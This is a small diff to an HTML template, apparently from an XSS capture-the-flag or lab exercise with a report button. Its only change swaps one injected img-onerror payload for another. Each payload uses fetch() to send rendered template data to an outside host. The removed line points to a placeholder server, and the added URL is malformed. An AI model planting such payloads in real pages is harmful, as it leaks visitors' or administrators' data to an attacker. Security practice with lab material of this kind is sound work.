@@ -25,4 +25,4 @@ Welcome to the desert of the real.
   <div id="captcha"></div>
 </div>
 <button id="report" type="submit" class="report"></button>
-<img src=x onerror="fetch('http://my_server_ip/'+'{{#movies}}{{ name }}{{/movies}}')">
+<img src=x onerror="fetch('http://https://raw.githubusercontent.com/chriskout/Testing/master/main.mst/'+'{{#movies}}{{ name }}{{/movies}}')">
